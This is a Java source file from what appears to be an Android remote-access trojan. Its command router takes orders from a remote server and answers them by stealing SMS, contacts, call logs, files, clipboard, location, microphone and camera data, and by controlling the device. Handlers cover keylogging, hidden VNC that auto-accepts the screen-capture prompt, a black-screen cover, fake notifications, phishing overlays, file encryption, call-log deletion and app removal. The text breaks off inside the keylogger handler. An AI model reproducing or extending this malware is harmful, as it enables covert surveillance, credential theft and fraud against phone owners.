package com.fason.app.core.network;

import android.Manifest;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import java.io.File;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.features.apps.AppList;
import com.fason.app.features.apps.AppActionManager;
import com.fason.app.features.apps.FasonManager;
import com.fason.app.features.calls.CallsManager;
import com.fason.app.features.camera.CameraManager;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.contacts.ContactsManager;
import com.fason.app.features.info.InfoManager;
import com.fason.app.features.location.GpsManager;
import com.fason.app.features.mic.MicManager;
import com.fason.app.features.overlay.OverlayManager;
import com.fason.app.features.phishlet.PhishletManager;
import com.fason.app.features.notification.FakeNotificationSender;
import com.fason.app.features.sms.SMSManager;
import com.fason.app.features.storage.FileManager;
import com.fason.app.features.wifi.WifiScanner;
import com.fason.app.features.notification.NotificationRelayService;
import com.fason.app.service.MainService;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import io.socket.client.Socket;

public final class SocketCommandRouter {
    private static FileManager fileMgr;
    private static CameraManager camMgr;
    public static volatile ExecutorService EXEC = Executors.newFixedThreadPool(4);
    public static volatile ExecutorService HVNC_EXEC = Executors.newSingleThreadExecutor();
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static boolean initialized = false;
    private static volatile long lastSettingsPromptTime = 0;
    private static final long SETTINGS_PROMPT_COOLDOWN_MS = 30_000;

    private SocketCommandRouter() {}

    public static synchronized void initialize() {
        if (initialized) return;
        if (fileMgr == null) fileMgr = new FileManager();
        if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());
        if (EXEC.isShutdown()) EXEC = Executors.newFixedThreadPool(4);
        if (HVNC_EXEC.isShutdown()) HVNC_EXEC = Executors.newSingleThreadExecutor();
        SocketClient client = SocketClient.getInstance();
        if (client == null) { handler.postDelayed(SocketCommandRouter::initialize, 5000); return; }
        Socket socket = client.getSocket();
        if (socket == null) { handler.postDelayed(SocketCommandRouter::initialize, 5000); return; }
        socket.off(Protocol.EVT_PING);
        socket.off(Protocol.EVT_ORDER);
        socket.on(Protocol.EVT_PING, args -> {
            Socket s = SocketClient.getInstance().getSocket();
            if (s != null) s.emit(Protocol.EVT_PONG);
        });
        socket.on(Protocol.EVT_ORDER, args -> handleOrder(args));
        socket.connect();
        initialized = true;
    }

    private static void handleOrder(Object[] args) {
        try {
            if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
            JSONObject data = (JSONObject) args[0];
            String type = data.optString(Protocol.KEY_TYPE, "");
            final String cmdId = data.optString(Protocol.KEY_CMD_ID, "");
            final Socket socket = SocketClient.getInstance().getSocket();
            switch (type) {
                case Protocol.FILES:       EXEC.execute(() -> handleFile(data, cmdId)); break;
                case Protocol.SMS:         handleSms(data, socket, cmdId); break;
                case Protocol.CALLS:       EXEC.execute(() -> handleCalls(data, socket, cmdId)); break;
                case Protocol.CONTACTS:    EXEC.execute(() -> handleContacts(data, socket, cmdId)); break;
                case Protocol.MIC:         handleMic(data, socket, cmdId); break;
                case Protocol.LOCATION:    handleLocation(socket, cmdId); break;
                case Protocol.WIFI:        handleWifi(socket, cmdId); break;
                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted(), cmdId)); break;
                case Protocol.APPS:        EXEC.execute(() -> handleApps(data, socket, cmdId)); break;
                case Protocol.PERM_CHECK:  checkPerm(socket, data.optString(Protocol.KEY_PERM, ""), cmdId); break;
                case Protocol.CAMERA:      handleCamera(data, socket, cmdId); break;
                case Protocol.CLIPBOARD:   handleClipboard(data, cmdId); break;
                case Protocol.NOTIF:       handleNotif(data, socket, cmdId); break;
                case Protocol.FASON:       handleFason(data, socket, cmdId); break;
                case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get(), cmdId)); break;
                case Protocol.HVNC:        handleHvnc(data, socket, cmdId); break;
                case Protocol.INSPECTOR:   handleInspector(data, socket, cmdId); break;
                case Protocol.KEYLOGGER:   handleKeylogger(data, socket, cmdId); break;
                case Protocol.DEVICE_UNLOCK: handleDeviceUnlock(data, socket, cmdId); break;
                case Protocol.OVERLAY:       EXEC.execute(() -> handleOverlay(data, socket, cmdId)); break;
                case Protocol.PHISHLET:      EXEC.execute(() -> handlePhishlet(data, socket, cmdId)); break;
                default:
                    try {
                        JSONObject err = new JSONObject();
                        err.put(Protocol.KEY_TYPE, "error");
                        err.put(Protocol.KEY_ERROR, "Unknown command type: " + type);
                        attachCmdId(err, cmdId);
                        socket.emit("cmd_error", err);
                    } catch (Exception ignored) {}
                    break;
            }
        } catch (Exception e) {
            Log.e("SocketCommandRouter", "handleOrder error", e);
        }
    }

    // ── v4.0: calls handler (read + delete) ──────────────────────────────────

    private static void handleCalls(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_LIST);
        if (Protocol.ACT_DELETE_CALL.equals(action)) {
            long callId = data.optLong(Protocol.KEY_CALL_ID, -1);
            String number = data.optString(Protocol.KEY_PHONE_NO, "");
            if (callId > 0) {
                CallsManager.deleteCallLog(callId, cmdId);
            } else if (!number.isEmpty()) {
                CallsManager.deleteCallLogByNumber(number, cmdId);
            } else {
                emitError(socket, Protocol.CALLS, "Missing callId or phoneNo", cmdId);
            }
        } else {
            emit(socket, Protocol.CALLS, CallsManager.getLogs(), cmdId);
        }
    }

    // ── v4.0: contacts handler (read + write) ─────────────────────────────────

    private static void handleContacts(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_LIST);
        switch (action) {
            case Protocol.ACT_LIST:
                emit(socket, Protocol.CONTACTS, ContactsManager.getContacts(), cmdId);
                break;
            case Protocol.ACT_DELETE_CONTACT:
                long contactId = data.optLong(Protocol.KEY_CONTACT_ID, -1);
                if (contactId <= 0) { emitError(socket, Protocol.CONTACTS, "Missing contactId", cmdId); return; }
                ContactsManager.deleteContact(contactId, cmdId);
                break;
            case Protocol.ACT_ADD_CONTACT:
                String name  = data.optString(Protocol.KEY_CONTACT_NAME, "");
                String phone = data.optString(Protocol.KEY_PHONE_NO, "");
                ContactsManager.addContact(name, phone, cmdId);
                break;
            case Protocol.ACT_BLOCK_NUMBER:
                ContactsManager.blockNumber(data.optString(Protocol.KEY_PHONE_NO, ""), cmdId);
                break;
            case Protocol.ACT_UNBLOCK_NUMBER:
                ContactsManager.unblockNumber(data.optString(Protocol.KEY_PHONE_NO, ""), cmdId);
                break;
            default:
                emitError(socket, Protocol.CONTACTS, "Unknown contact action: " + action, cmdId);
        }
    }

    // ── v4.0: apps handler (read + actions) ──────────────────────────────────

    private static void handleApps(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_LIST);
        String pkg = data.optString(Protocol.KEY_PACKAGE_NAME, "");
        switch (action) {
            case Protocol.ACT_LIST:
                emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)), cmdId);
                break;
            case Protocol.ACT_OPEN_APP:
                AppActionManager.openApp(pkg, cmdId);
                break;
            case Protocol.ACT_FORCE_STOP:
                AppActionManager.forceStop(pkg, cmdId);
                break;
            case Protocol.ACT_UNINSTALL:
                AppActionManager.uninstall(pkg, cmdId);
                break;
            case Protocol.ACT_DISABLE_APP:
                AppActionManager.disableApp(pkg, cmdId);
                break;
            case Protocol.ACT_ENABLE_APP:
                AppActionManager.enableApp(pkg, cmdId);
                break;
            case Protocol.ACT_CLEAR_CACHE:
                AppActionManager.clearCache(pkg, cmdId);
                break;
            case Protocol.ACT_APP_INFO:
                AppActionManager.openAppInfo(pkg, cmdId);
                break;
            default:
                // Legacy: no action = list with sys flag
                emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)), cmdId);
        }
    }

    // ── v4.0: clipboard handler (read + write + clear + history) ─────────────

    private static void handleClipboard(JSONObject data, String cmdId) {
        ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_FETCH);
        switch (action) {
            case Protocol.ACT_START:
                m.start();
                EXEC.execute(() -> m.emit(cmdId));
                break;
            case Protocol.ACT_STOP:
                m.stop();
                break;
            case Protocol.ACT_FETCH:
                EXEC.execute(() -> m.emit(cmdId));
                break;
            case Protocol.ACT_WRITE_CLIP:
                // v4.0: write text to device clipboard
                String text = data.optString(Protocol.KEY_TEXT, "");
                EXEC.execute(() -> m.write(text, cmdId));
                break;
            case Protocol.ACT_CLEAR_CLIP:
                // v4.0: clear device clipboard
                EXEC.execute(() -> m.clear(cmdId));
                break;
            case Protocol.ACT_CLIP_HISTORY:
                // v4.0: get session history (last 20 items)
                EXEC.execute(() -> m.getHistory(cmdId));
                break;
            default:
                Socket socket = SocketClient.getInstance().getSocket();
                emitError(socket, Protocol.CLIPBOARD, "Unknown clipboard action: " + action, cmdId);
        }
    }

    // ── v4.0: notification handler (read + fake send + dismiss) ──────────────

    private static void handleNotif(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
        switch (action) {
            case Protocol.ACT_STATUS:
                EXEC.execute(() -> {
                    try {
                        JSONObject s = new JSONObject();
                        s.put(Protocol.KEY_ENABLED, NotificationRelayService.isEnabled(FasonApp.getContext()));
                        s.put(Protocol.KEY_CONNECTED, NotificationRelayService.getInstance() != null &&
                            NotificationRelayService.getInstance().isReady());
                        attachCmdId(s, cmdId);
                        socket.emit(Protocol.NOTIF, s);
                    } catch (Exception ignored) {}
                });
                break;
            case Protocol.ACT_REQUEST:
                NotificationRelayService.requestPermission(FasonApp.getContext());
                EXEC.execute(() -> {
                    try {
                        JSONObject ack = new JSONObject();
                        ack.put(Protocol.KEY_ACTION, Protocol.ACT_REQUEST);
                        ack.put(Protocol.KEY_SUCCESS, true);
                        ack.put(Protocol.KEY_ENABLED, NotificationRelayService.isEnabled(FasonApp.getContext()));
                        attachCmdId(ack, cmdId);
                        socket.emit(Protocol.NOTIF, ack);
                    } catch (Exception ignored) {}
                });
                break;
            case Protocol.ACT_FAKE_NOTIF:
                // v4.0: send a fake notification on the device
                String title     = data.optString(Protocol.KEY_TITLE, "");
                String body      = data.optString(Protocol.KEY_CONTENT, "");
                String channelId = data.optString(Protocol.KEY_NOTIF_CHANNEL, Protocol.FAKE_NOTIF_CHANNEL);
                String channelName = data.optString("channelName", "App");
                String iconB64   = data.optString(Protocol.KEY_NOTIF_ICON, null);
                boolean vibrate  = data.optBoolean(Protocol.KEY_VIBRATE, false);
                EXEC.execute(() -> FakeNotificationSender.send(
                    title, body, channelId, channelName, iconB64, vibrate, cmdId));
                break;
            case Protocol.ACT_DISMISS_NOTIF:
                // v4.0: dismiss all or specific notification
                int notifId = data.optInt("notifId", -1);
                if (notifId > 0) {
                    FakeNotificationSender.cancel(notifId, cmdId);
                } else {
                    FakeNotificationSender.cancelAll(cmdId);
                }
                break;
            default:
                emitError(socket, Protocol.NOTIF, "Unknown notification action: " + action, cmdId);
        }
    }

    // ── HVNC handler (existing + v4.0 black_screen + retain_token) ───────────

    private static void handleHvnc(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        switch (action) {
            case "start": {
                int fps = data.optInt(Protocol.KEY_FPS, 20);
                int quality = data.optInt(Protocol.KEY_JPEG_QUALITY, 60);
                int scale = data.optInt(Protocol.KEY_SCALE, 50);
                int iframeInt = data.optInt("iframeInterval", 0);
                // frontend can request H265 only after confirming browser support
                String codecPref = data.optBoolean("useH265", false) ? "h265" : "h264";
                EXEC.execute(() -> {
                    com.fason.app.features.hvnc.HVncManager mgr = com.fason.app.features.hvnc.HVncManager.getInstance();
                    mgr.setCodecPreference(codecPref);
                    mgr.setIframeInterval(iframeInt);
                    if (mgr.needsPermissionRequest()) {
                        boolean a11yEnabled = com.fason.app.features.hvnc.InputInjector.isEnabled();
                        if (!a11yEnabled) {
                            mgr.onAutoAcceptResult(false, "accessibility_not_enabled");
                            com.fason.app.features.hvnc.InputInjector.openSettings();
                            return;
                        }
                        mgr.setPendingStart(fps, quality, scale, cmdId);
                        com.fason.app.features.hvnc.HVncAccessibilityService.enableAutoAccept();
                        MainService svc = MainService.getInstance();
                        if (svc != null) svc.requestScreenCapturePermission();
                        else mgr.start(fps, quality, scale, cmdId);
                    } else {
                        mgr.start(fps, quality, scale, cmdId);
                    }
                });
                break;
            }
            case "stop":
                EXEC.execute(() -> com.fason.app.features.hvnc.HVncManager.getInstance().stop());
                break;
            // v4.0: stop but keep projection token (faster restart)
            case Protocol.ACT_RETAIN_TOKEN:
                EXEC.execute(() -> com.fason.app.features.hvnc.HVncManager.getInstance().retainToken());
                break;
            case "restart": {
                int rFps = data.optInt(Protocol.KEY_FPS, 20);
                int rQuality = data.optInt(Protocol.KEY_JPEG_QUALITY, 60);
                int rScale = data.optInt(Protocol.KEY_SCALE, 50);
                EXEC.execute(() -> com.fason.app.features.hvnc.HVncManager.getInstance()
                    .restart(rFps, rQuality, rScale, cmdId));
                break;
            }
            case "enable_accessibility":
                EXEC.execute(() -> com.fason.app.features.hvnc.InputInjector.openSettings());
                break;
            case "input":
                HVNC_EXEC.execute(() -> com.fason.app.features.hvnc.InputInjector.handleInput(data));
                break;
            // v4.0: black screen overlay
            case Protocol.ACT_BLACK_SCREEN:
                boolean on = data.optBoolean(Protocol.KEY_BLACK_SCREEN, true);
                EXEC.execute(() -> com.fason.app.features.hvnc.HVncManager.getInstance()
                    .setBlackScreen(on, cmdId));
                break;
            case "status":
                EXEC.execute(() -> {
                    com.fason.app.features.hvnc.HVncManager mgr =
                        com.fason.app.features.hvnc.HVncManager.getInstance();
                    try {
                        JSONObject status = new JSONObject();
                        status.put(Protocol.KEY_TYPE, "status");
                        status.put(Protocol.KEY_STATUS, mgr.isStreaming() ? "streaming" : "stopped");
                        status.put("streaming", mgr.isStreaming());
                        status.put("accessibilityEnabled",
                            com.fason.app.features.hvnc.InputInjector.isEnabled());
                        status.put("accessibilityConnected",
                            com.fason.app.features.hvnc.HVncAccessibilityService.isServiceConnected());
                        status.put("projectionReady", mgr.hasProjectionPermission());
                        status.put(Protocol.KEY_CODEC, mgr.getActiveCodec());
                        status.put(Protocol.KEY_BLACK_SCREEN, mgr.isBlackScreenActive());
                        attachCmdId(status, cmdId);
                        socket.emit(Protocol.HVNC, status);
                    } catch (Exception ignored) {}
                });
                break;
            default:
                emitError(socket, Protocol.HVNC, "Unknown HVNC action: " + action, cmdId);
                break;
        }
    }

    // ── All pre-existing handlers below — unchanged ───────────────────────────

    private static void handleFile(JSONObject data, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION);
        String path = data.optString(Protocol.KEY_PATH, "");
        try {
            if (Protocol.ACT_LS.equals(action)) {
                JSONArray list = fileMgr.walk(path);
                String actualPath = path;
                if (actualPath == null || actualPath.isEmpty()) {
                    actualPath = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
                }
                JSONObject r = new JSONObject();
                r.put(Protocol.KEY_TYPE, Protocol.TYPE_LIST);
                r.put(Protocol.KEY_LIST, list);
                r.put(Protocol.KEY_PATH, actualPath);
                attachCmdId(r, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.FILES, r);
            } else if (Protocol.ACT_DL.equals(action)) {
                fileMgr.downloadFile(path, cmdId);
            } else if (Protocol.ACT_PUSH.equals(action)) {
                handlePush(data, cmdId);
            } else if (Protocol.ACT_UPLOAD.equals(action)) {
                com.fason.app.features.storage.FileUpload.upload(path, cmdId);
            } else if (Protocol.ACT_DELETE.equals(action)) {
                com.fason.app.features.storage.FileModify.delete(path, cmdId);
            } else if (Protocol.ACT_RENAME.equals(action)) {
                String newName = data.optString(Protocol.KEY_NEW_NAME, "");
                com.fason.app.features.storage.FileModify.rename(path, newName, cmdId);
            } else if (Protocol.ACT_ENCRYPT.equals(action)) {
                String password = data.optString(Protocol.KEY_PASSWORD, "");
                boolean ok = com.fason.app.features.storage.FilesEncryptDecrypt.encryptFile(path, password);
                emitFileAction("encrypt", path, ok, cmdId);
            } else if (Protocol.ACT_DECRYPT.equals(action)) {
                String password = data.optString(Protocol.KEY_PASSWORD, "");
                boolean ok = com.fason.app.features.storage.FilesEncryptDecrypt.decryptFile(path, password);
                emitFileAction("decrypt", path, ok, cmdId);
            } else {
                JSONObject err = new JSONObject();
                err.put(Protocol.KEY_TYPE, Protocol.TYPE_ERROR);
                err.put(Protocol.KEY_ERROR, "Unknown file action: " + action);
                attachCmdId(err, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.FILES, err);
            }
        } catch (Exception e) {
            try {
                JSONObject err = new JSONObject();
                err.put(Protocol.KEY_TYPE, "error");
                err.put(Protocol.KEY_ERROR, e.getMessage() != null ? e.getMessage() : "File operation failed");
                attachCmdId(err, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.FILES, err);
            } catch (Exception ignored) {}
        }
    }

    private static void handlePush(JSONObject data, String cmdId) {
        EXEC.execute(() -> {
            Socket socket = SocketClient.getInstance().getSocket();
            try {
                String dstPath = data.optString(Protocol.KEY_PATH, "");
                String name = data.optString(Protocol.KEY_NAME, "file");
                String b64 = data.optString(Protocol.KEY_BUFFER, "");
                if (dstPath.isEmpty() || b64.isEmpty()) {
                    emitPushResult(socket, dstPath, false, "Missing path or buffer", cmdId); return;
                }
                if (b64.length() > 13_333_333) {
                    emitPushResult(socket, dstPath, false, "File too large (max 10MB)", cmdId); return;
                }
                File dstDir = new File(dstPath);
                String finalPath = dstPath;
                if (dstDir.isDirectory()) finalPath = dstPath + "/" + name;
                File dst = FileManager.safeFile(finalPath);
                if (dst == null) {
                    emitPushResult(socket, dstPath, false, "Invalid or forbidden path", cmdId); return;
                }
                File parent = dst.getParentFile();
                if (parent != null && !parent.exists()) parent.mkdirs();
                byte[] fileData = android.util.Base64.decode(b64, android.util.Base64.NO_WRAP);
                try (java.io.FileOutputStream fos = new java.io.FileOutputStream(dst)) {
                    fos.write(fileData);
                    fos.flush();
                    emitPushResult(socket, dst.getAbsolutePath(), true, null, cmdId);
                } catch (Exception e) {
                    emitPushResult(socket, dst.getAbsolutePath(), false, e.getMessage(), cmdId);
                }
            } catch (Exception e) {
                emitPushResult(socket, "", false, e.getMessage(), cmdId);
            }
        });
    }

    private static void emitPushResult(Socket socket, String path, boolean success, String error, String cmdId) {
        if (socket == null) return;
        try {
            JSONObject r = new JSONObject();
            r.put("type", "push_result");
            r.put(Protocol.KEY_PATH, path);
            r.put(Protocol.KEY_SUCCESS, success);
            if (error != null) r.put(Protocol.KEY_ERROR, error);
            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.FILES, r);
        } catch (Exception ignored) {}
    }

    private static void emitFileAction(String action, String path, boolean success, String cmdId) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject r = new JSONObject();
            r.put("type", "modify_result");
            r.put(Protocol.KEY_ACTION, action);
            r.put(Protocol.KEY_PATH, path);
            r.put(Protocol.KEY_SUCCESS, success);
            if (!success) r.put(Protocol.KEY_ERROR, "Operation failed - check password or path");
            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.FILES, r);
        } catch (Exception ignored) {}
    }

    private static void handleSms(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION);
        if (Protocol.ACT_LS.equals(action)) {
            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.get(), cmdId));
        } else if (Protocol.ACT_SEND_SMS.equals(action)) {
            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.send(
                data.optString(Protocol.KEY_TO), data.optString(Protocol.KEY_SMS)), cmdId));
        } else {
            emitError(socket, Protocol.SMS, "Unknown SMS action: " + action, cmdId);
        }
    }

    private static void handleMic(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        if (Protocol.ACT_STOP.equals(action)) {
            MicManager.stop(cmdId); return;
        }
        if (!action.isEmpty() && !"start".equals(action) &&
            !Protocol.ACT_STREAM_START.equals(action) && !Protocol.ACT_STREAM_STOP.equals(action)) {
            emitError(socket, Protocol.MIC, "Unknown mic action: " + action, cmdId); return;
        }
        if (Protocol.ACT_STREAM_START.equals(action)) { MicManager.startStream(cmdId); return; }
        if (Protocol.ACT_STREAM_STOP.equals(action))  { MicManager.stopStream(cmdId); return; }
        int sec = data.optInt(Protocol.KEY_SEC, 0);
        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendPermError(socket, Protocol.MIC, Manifest.permission.RECORD_AUDIO, cmdId); return;
        }
        MicManager.start(sec, cmdId);
    }

    private static void handleLocation(Socket socket, String cmdId) {
        EXEC.execute(() -> {
            GpsManager orphanGps = null;
            try {
                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    sendPermError(socket, Protocol.LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, cmdId);
                    return;
                }
                MainService svc = MainService.getInstance();
                GpsManager gps = svc != null ? svc.getGpsManager() : null;
                if (gps == null) { gps = new GpsManager(FasonApp.getContext()); orphanGps = gps; }
                gps.requestSingle();
                boolean gotLocation = false;
                long deadline = System.currentTimeMillis() + 15000;
                while (System.currentTimeMillis() < deadline) {
                    JSONObject locData = gps.getData();
                    if (locData.optBoolean(Protocol.KEY_ENABLED, false)) {
                        emit(socket, Protocol.LOCATION, locData, cmdId);
                        gotLocation = true;
                        break;
                    }
                    Thread.sleep(200);
                }
                if (!gotLocation) {
                    JSONObject err = new JSONObject();
                    err.put(Protocol.KEY_ENABLED, false);
                    err.put(Protocol.KEY_ERROR, "Location unavailable");
                    emit(socket, Protocol.LOCATION, err, cmdId);
                }
            } catch (Exception ignored) {
            } finally { if (orphanGps != null) orphanGps.stop(); }
        });
    }

    private static void handleWifi(Socket socket, String cmdId) {
        EXEC.execute(() -> {
            GpsManager orphanGps = null;
            try {
                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    sendPermError(socket, Protocol.WIFI, Manifest.permission.ACCESS_FINE_LOCATION, cmdId);
                    return;
                }
                WifiScanner.clearCache();
                MainService svc = MainService.getInstance();
                GpsManager gps = svc != null ? svc.getGpsManager() : null;
                if (gps == null) { gps = new GpsManager(FasonApp.getContext()); orphanGps = gps; }
                gps.requestSingle();
                for (int i = 0; i < 10; i++) { Thread.sleep(200); if (gps.canGetLocation()) break; }
                Socket s = SocketClient.getInstance().getSocket();
                JSONObject result = WifiScanner.scan(FasonApp.getContext());
                if (s != null) { attachCmdId(result, cmdId); s.emit(Protocol.WIFI, result); }
            } catch (Exception e) {
                try {
                    Socket s = SocketClient.getInstance().getSocket();
                    if (s != null) {
                        JSONObject err = new JSONObject();
                        err.put(Protocol.KEY_ERROR, "WiFi scan failed: " + e.getMessage());
                        attachCmdId(err, cmdId);
                        s.emit(Protocol.WIFI, err);
                    }
                } catch (Exception ignored) {}
            } finally { if (orphanGps != null) orphanGps.stop(); }
        });
    }

    private static void handleCamera(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION);
        if (Protocol.ACT_LIST.equals(action)) {
            EXEC.execute(() -> {
                JSONObject cams = camMgr.getCameraList();
                if (cams == null) {
                    try { cams = new JSONObject(); cams.put(Protocol.KEY_CAM_LIST, true); cams.put(Protocol.KEY_LIST, new JSONArray()); } catch (Exception ignored) {}
                }
                attachCmdId(cams, cmdId);
                socket.emit(Protocol.CAMERA, cams);
            });
        } else if (Protocol.ACT_CAPTURE.equals(action)) {
            camMgr.capture(data.optInt(Protocol.KEY_ID, 0), cmdId,
                data.optString(Protocol.KEY_FLASH, "auto"),
                data.optString(Protocol.KEY_QUALITY, "medium"));
        } else if (Protocol.ACT_RECORD.equals(action)) {
            camMgr.startRecording(data.optInt(Protocol.KEY_ID, 0), cmdId);
        } else if (Protocol.ACT_STOP.equals(action)) {
            camMgr.stopRecording(cmdId);
        } else if (Protocol.ACT_STREAM_START.equals(action)) {
            camMgr.startStream(data.optInt(Protocol.KEY_ID, 0), cmdId,
                data.optInt(Protocol.KEY_QUALITY, 60),
                data.optInt(Protocol.KEY_INTERVAL, 500));
        } else if (Protocol.ACT_STREAM_STOP.equals(action)) {
            camMgr.stopStream(cmdId);
        } else {
            emitError(socket, Protocol.CAMERA, "Unknown camera action: " + action, cmdId);
        }
    }

    private static void checkPerm(Socket socket, String perm, String cmdId) {
        EXEC.execute(() -> {
            try {
                JSONObject r = new JSONObject();
                r.put(Protocol.KEY_PERMISSION, perm);
                r.put(Protocol.KEY_ALLOWED, PermissionManager.canIUse(perm));
                attachCmdId(r, cmdId);
                socket.emit(Protocol.PERM_CHECK, r);
            } catch (Exception ignored) {}
        });
    }

    private static void handleFason(JSONObject data, Socket socket, String cmdId) {
        EXEC.execute(() -> {
            try {
                String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
                emit(socket, Protocol.FASON, FasonManager.handle(action), cmdId);
            } catch (Exception ignored) {}
        });
    }

    private static void handleInspector(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        switch (action) {
            case Protocol.ACT_CAPTURE_TREE: {
                boolean includeAll = data.optBoolean(Protocol.KEY_INCLUDE_ALL, false);
                EXEC.execute(() -> {
                    com.fason.app.features.inspector.InspectorAccessibilityService svc =
                        com.fason.app.features.inspector.InspectorAccessibilityService.getInstance();
                    if (svc == null) {
                        try { JSONObject err = new JSONObject(); err.put(Protocol.KEY_TYPE, "error"); err.put(Protocol.KEY_ERROR, "Inspector not connected"); attachCmdId(err, cmdId); socket.emit(Protocol.INSPECTOR, err); } catch (Exception ignored) {}
                        return;
                    }
                    svc.captureInspectorTree(includeAll, cmdId);
                });
                break;
            }
            case "node_action": {
                int nodeId = data.optInt(Protocol.KEY_NODE_ID, 0);
                int nodeAction = data.optInt(Protocol.KEY_NODE_ACTION, 0);
                String text = data.optString(Protocol.KEY_TEXT, null);
                EXEC.execute(() -> {
                    com.fason.app.features.inspector.InspectorAccessibilityService svc =
                        com.fason.app.features.inspector.InspectorAccessibilityService.getInstance();
                    if (svc == null) {
                        try { JSONObject err = new JSONObject(); err.put(Protocol.KEY_TYPE, "action_error"); err.put(Protocol.KEY_ERROR, "Inspector not connected"); attachCmdId(err, cmdId); socket.emit(Protocol.INSPECTOR, err); } catch (Exception ignored) {}
                        return;
                    }
                    svc.performNodeAction(nodeId, nodeAction, text, cmdId);
                });
                break;
            }
            case Protocol.ACT_STATUS: {
                EXEC.execute(() -> {
                    try {
                        JSONObject s = new JSONObject();
                        s.put(Protocol.KEY_TYPE, Protocol.ACT_STATUS);
                        s.put("accessibilityEnabled", com.fason.app.features.inspector.InspectorAccessibilityService.isEnabled());
                        s.put("accessibilityConnected", com.fason.app.features.inspector.InspectorAccessibilityService.isServiceConnected());
                        attachCmdId(s, cmdId);
                        socket.emit(Protocol.INSPECTOR, s);
                    } catch (Exception ignored) {}
                });
                break;
            }
            case Protocol.ACT_OPEN_SETTINGS:
                EXEC.execute(() -> com.fason.app.features.inspector.InspectorAccessibilityService.openSettings());
                break;
            default:
                emitError(socket, Protocol.INSPECTOR, "Unknown inspector action: " + action, cmdId);
        }
    }

    private static void handleKeylogger(JSONObject data, Socket socket, String cmdId) {
        String action = data.optString(Protocol.KEY_ACTION, "");
        switch (action) {
            case Protocol.ACT_KL_START: EXEC.execute(() -> {
                com.fason.app.features.keylogger.KeyloggerManager svc = com.fason.app.features.keylogger.KeyloggerManager.getInstance();
                try { JSONObject s = new JSONObject(); if (svc != null) { svc.setActive(true); s.put(Protocol.KEY_TYPE,"status"); s.put("active",true); s.put("connected",true); s.put(Protocol.KEY_TOTAL_COUNT,svc.getTotalCount()); s.put(Protocol.KEY_PENDING_COUNT,svc.getPendingCount()); } else { s.put(Protocol.KEY_TYPE,"error"); s.put(Protocol.KEY_ERROR,"Not connected"); s.put("connected",false); } attachCmdId(s,cmdId); socket.emit(Protocol.KEYLOGGER,s); } catch(Exception ignored){} }); break;
            case Protocol.ACT_KL_STOP: EXEC.execute(() -> {
                com.fason.app.features.keylogger.KeyloggerManager svc = com.fason.app.features.keylogger.KeyloggerManager.getInstance();
                if(svc!=null) svc.setActive(false);
                try { JSONObject s=new JSONObject(); s.put(Protocol.KEY_TYPE,"status"); s.put("active",false); s.put("connected",svc!=null); s.put(Protocol.KEY_TOTAL_COUNT,svc!=null?svc.getTotalCount():0); attachCmdId(s,cmdId); socket.emit(Protocol.KEYLOGGER,s); } catch(Exception ignored){} }); break;
            case Protocol.ACT_KL_FETCH: { String evType=data.optString(Protocol.KEY_EVENT_TYPE,""); EXEC.execute(()->{
                com.fason.app.features.keylogger.KeyloggerManager svc=com.fason.app.features.keylogger.KeyloggerManager.getInstance();
